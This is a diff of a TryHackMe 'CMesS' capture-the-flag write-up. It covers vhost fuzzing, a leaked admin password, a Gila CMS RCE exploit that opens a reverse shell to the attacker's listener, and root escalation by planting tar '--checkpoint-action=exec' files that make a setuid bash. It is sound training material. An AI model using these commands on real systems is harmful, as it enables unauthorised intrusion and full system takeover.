@@ -4,7 +4,7 @@ title: CMesS THM Write-Up
 machine_ip: varies
 os: Linux
 difficulty: Medium
-my_rating: 
+my_rating: 3
 tags:
   - Linux
   - PrivEsc
@@ -17,6 +17,13 @@ tags:
   - ffuf
   - whatweb
   - gobuster
+  - Wildcards
+  - Crontab
+  - Enum
+  - linpeas
+  - linux-exploit-suggester
+  - nc
+  - ssh
 references: "[[📚CTF Box Writeups]]"
 ---
 
@@ -214,64 +221,67 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 ```
 - Web server is #Apache and running #Gila CMS
 - there is an `admin` login page
-- gobuster for subdomain enumeration
+- ffuf for vhost enumeration
 ```
-┌──(root㉿kali)-[~/Transfer]
-└─# gobuster dir -u  http://10.10.179.92/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.179.92/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/index                (Status: 200) [Size: 3860]
-/about                (Status: 200) [Size: 3359]
-/search               (Status: 200) [Size: 3860]
-/blog                 (Status: 200) [Size: 3860]
-/login                (Status: 200) [Size: 1583]
-/1                    (Status: 200) [Size: 4090]
-/01                   (Status: 200) [Size: 4090]
-/category             (Status: 200) [Size: 3871]
-/themes               (Status: 301) [Size: 324] [--> http://10.10.179.92/themes/?url=themes]
-/feed                 (Status: 200) [Size: 735]
-/0                    (Status: 200) [Size: 3860]
-/admin                (Status: 200) [Size: 1583]
-/assets               (Status: 301) [Size: 324] [--> http://10.10.179.92/assets/?url=assets]
-/tag                  (Status: 200) [Size: 3883]
-/author               (Status: 200) [Size: 3599]
-/sites                (Status: 301) [Size: 322] [--> http://10.10.179.92/sites/?url=sites]
-/Search               (Status: 200) [Size: 3860]
-/About                (Status: 200) [Size: 3345]
-/log                  (Status: 301) [Size: 318] [--> http://10.10.179.92/log/?url=log]
-/Index                (Status: 200) [Size: 3860]
-/tags                 (Status: 200) [Size: 3145]
-/1x1                  (Status: 200) [Size: 4090]
-/lib                  (Status: 301) [Size: 318] [--> http://10.10.179.92/lib/?url=lib]
-/src                  (Status: 301) [Size: 318] [--> http://10.10.179.92/src/?url=src]
-/api                  (Status: 200) [Size: 0]
-/001                  (Status: 200) [Size: 4090]
-/cm                   (Status: 500) [Size: 0]
-/1pix                 (Status: 200) [Size: 4090]
-/fm                   (Status: 200) [Size: 0]
-/tmp                  (Status: 301) [Size: 318] [--> http://10.10.179.92/tmp/?url=tmp]
-/1a                   (Status: 200) [Size: 4090]
-/0001                 (Status: 200) [Size: 4090]
-/1x1transparent       (Status: 200) [Size: 4090]
-/INDEX                (Status: 200) [Size: 3860]
-/1px                  (Status: 200) [Size: 4090]
-/1d                   (Status: 200) [Size: 4090]
-/1_1                  (Status: 200) [Size: 4090]
-/Author               (Status: 200) [Size: 3599]
+┌──(root㉿swabby)-[~/Downloads]
+└─# ffuf -w /usr/share/seclists/SecLists-master/Discovery/DNS/shubs-subdomains.txt -u http://10.10.218.218 -H "HOST: FUZZ.cmess.thm". -fs 3904,3886,3883,3877,3895,3889,3880,3910,3892,3898  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.218.218
+ :: Wordlist         : FUZZ: /usr/share/seclists/SecLists-master/Discovery/DNS/shubs-subdomains.txt
+ :: Header           : Host: FUZZ.cmess.thm.
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3904,3886,3883,3877,3895,3889,3880,3910,3892,3898
+________________________________________________
+
+admissions              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 159ms]
+s                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 168ms]
+blackboard              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 163ms]
+i                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 164ms]
+dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 153ms]
+biblioteca              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 162ms]
+developers              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 170ms]
+e                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 160ms]
+t                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 168ms]
+registration            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 160ms]
+repository              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 162ms]
+reservations            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 166ms]
+v                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 184ms]
+a                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 181ms]
+webadvisor              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 180ms]
+ekaterinburg            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 161ms]
+c                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 213ms]
+commencement            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 207ms]
+membership              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 200ms]
+m                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 4992ms]
+d                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 163ms]
+obituaries              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 165ms]
+b                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 161ms]
+university              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 178ms]
+vestibular              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 174ms]
+g                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 209ms]
+psychology              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 165ms]
+financialaid            [Status: 200, Size: 3907, Words: 522, Lines: 108, Duration: 164ms]
+www.comune              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 157ms]
+www.alumni              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 168ms]
+p                       [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 245ms]
+newsletter              [Status: 200, Size: 3901, Words: 522, Lines: 108, Duration: 199ms]
 ```
-- None of these pages appear to give me more information
+- `dev` stands out as its size is different from the others. 
 
 - whatweb ouptput
 ```
@@ -280,18 +290,209 @@ Starting gobuster in directory enumeration mode
 http://10.10.179.92 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.179.92], MetaGenerator[Gila CMS], Script
 ```
 
-- Looking more into the `http://cmess.thm/admin` login web portal
-	- found [this](https://github.com/GilaCMS/gila/blob/master/config.default.php) github showing the `config.default.php` GilaCMS default admin email
-		- `admin@mail.com`
-- Need to enumerate further
+- see `dev.cmess.thm`
+	- MUST ALSO ADD TO `/etc/hosts` file with same IP as `cmess.thm` (because it is a virtual host)
+	- This site shows the Development Log showing a reset password in clear text
+```
+## Development Log
+
+### andre@cmess.thm
+
+Have you guys fixed the bug that was found on live?
+
+### support@cmess.thm
+
+Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
+
+### support@cmess.thm
+
+Update! We have had to delay the patch due to unforeseen circumstances
+
+### andre@cmess.thm
+
+That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
+
+### support@cmess.thm
+
+Your password has been reset. Here: KPFTN_f2yxe%
+```
+- We can login to the admin panel 
+	- `andre@cmess.thm:KPFTN_f2yxe%`
+	- from here we can now see the version of Gila CMS
+		- `Gila CMS version 1.10.9`
 
 ---
 # Foothold
 
 - gain shell via exploit
+- Looking for an exploit for Gila CMS version 1.10.9, we find this [exploit](https://www.exploit-db.com/exploits/51569) that gives use RCE if we have authentication
+	- Exploit successfully generated a webshell
+```
+┌──(root㉿swabby)-[~/Downloads]
+└─# python 51569.py              
+  File "51569.py", line 15
+SyntaxError: Non-ASCII character '\xe2' in file 51569.py on line 16, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details
+                                                                                                                    
+┌──(root㉿swabby)-[~/Downloads]
+└─# python3 51569.py                  
 
+ ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗                             
+██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝                             
+██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗                               
+██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝                               
+╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗                             
+ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝                             
+                                                                                                                    
+                              by Unknown_Exploit                                                                    
+                                                                                                                    
+Enter the target login URL (e.g., http://example.com/admin/): http://cmess.thm/admin
+Enter the email: andre@cmess.thm
+Enter the password: KPFTN_f2yxe%
+Enter the local IP (LHOST): 10.2.1.119
+Enter the local port (LPORT): 1337
+File uploaded successfully.
+```
+
+- Caught shell with `nc` on port 1337
+```
+┌──(root㉿swabby)-[~/Downloads]
+└─# nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.2.1.119] from (UNKNOWN) [10.10.218.218] 49622
+bash: cannot set terminal process group (736): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cmess:/var/www/html/tmp$ whoami
+whoami
+www-data
+```
+
+- Checking attack vectors using my Linux PrivEsc notes
+```
+www-data@cmess:/var/www/html/tmp$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+```
+- we see a cron job runs every 30 seconds backing up andres home folder,
+	- NOTE there is a wildcard! Just what we needed
+	- but we are www-data and cant edit andre's folder
+	- On the admin page we find a `config.php` file with the following lines
+```
+	'user' => 'root',
+    'pass' => 'r0otus3rpassw0rd',
+```
+- Not providing access to SSH, must enumerate more
+
+## Pivot to user andre
+
+- manual enumeration of files led us to find:
+```
+www-data@cmess:/opt$ cat .password.bak
+cat .password.bak
+andres backup password
+UQfsdCB7aAP6
+```
+- Knowing they have SSH open, we can ssh to `andre:UQfsdCB7aAP6`
+```
+┌──(root㉿kali)-[~/Transfer]
+└─# ssh andre@10.10.144.140
+andre@10.10.144.140's password: 
+
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
+andre@cmess:~$ whoami
+andre
+```
+
+- User flag - andre
+```
+andre@cmess:~$ cat user.txt
+thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
+```
 
 ---
 # PrivEsc
 
 - escalate to root
+- Move to `/tmp` and use `wget` from RHOST and `SimpleHTTPServer` from LHOST to run automated privesc suggester tools
+- #linux-exploit-suggester 
+```
+www-data@cmess:/tmp$ wget http://10.6.15.124:80/linux-exploit-suggester.sh
+wget http://10.6.15.124:80/linux-exploit-suggester.sh
+--2024-10-20 13:05:16--  http://10.6.15.124/linux-exploit-suggester.sh
+Connecting to 10.6.15.124:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 90858 (89K) [text/x-sh]
+Saving to: 'linux-exploit-suggester.sh'
+
+     0K .......... .......... .......... .......... .......... 56%  169K 0s
+    50K .......... .......... .......... ........             100%  284K=0.4s
+
+2024-10-20 13:05:17 (205 KB/s) - 'linux-exploit-suggester.sh' saved [90858/90858]
+```
+- Ran the same with #linpeas 
+
+- Crontab wildcard exploit identified found manually during enumeration
+- Proceed to escalate to root:
+```
+andre@cmess:~/backup$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+
+andre@cmess:~/backup$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
+andre@cmess:~/backup$ chmod +x runme.sh 
+andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
+andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
+
+andre@cmess:~/backup$ ll
+total 16
+drwxr-x--- 2 andre andre 4096 Oct 20 14:21 ./
+drwxr-x--- 4 andre andre 4096 Oct 20 14:14 ../
+-rw-rw-r-- 1 andre andre    0 Oct 20 14:21 --checkpoint=1
+-rw-rw-r-- 1 andre andre    0 Oct 20 14:21 --checkpoint-action=exec=sh runme.sh
+-rwxr-x--- 1 andre andre   51 Feb  9  2020 note*
+-rwxrwxr-x 1 andre andre   43 Oct 20 14:21 runme.sh*
+```
+
+- wait 2 minutes, run `/tmp/bash -p`
+```
+andre@cmess:~/backup$ /tmp/bash -p
+bash-4.3# whoami
+root
+```
+
+- Root flag
+```
+bash-4.3# cat root.txt
+thm{9f85b7fdeb2cf96985bf5761a93546a2}
+```
